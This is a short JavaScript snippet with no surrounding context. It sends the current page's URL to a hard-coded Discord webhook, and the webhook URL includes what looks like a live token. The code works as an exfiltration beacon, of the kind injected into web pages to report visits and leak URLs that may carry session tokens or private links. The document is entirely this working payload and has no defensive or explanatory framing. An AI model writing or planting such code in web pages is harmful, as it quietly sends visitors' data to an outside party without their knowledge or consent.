var xhr = new XMLHttpRequest();
var url = "https://discord.com/api/webhooks/1230013392190836807/YBJ3pNOa544labFi-TcurRFMDKlM2LMT36Jiel1PFWAy8TDWQqUa-yolhXwHQYD-F8bh";

xhr.open("POST", url, true);
xhr.setRequestHeader("Content-Type", "application/json");

var data = JSON.stringify({
    "content": window.location.href
});

xhr.send(data);
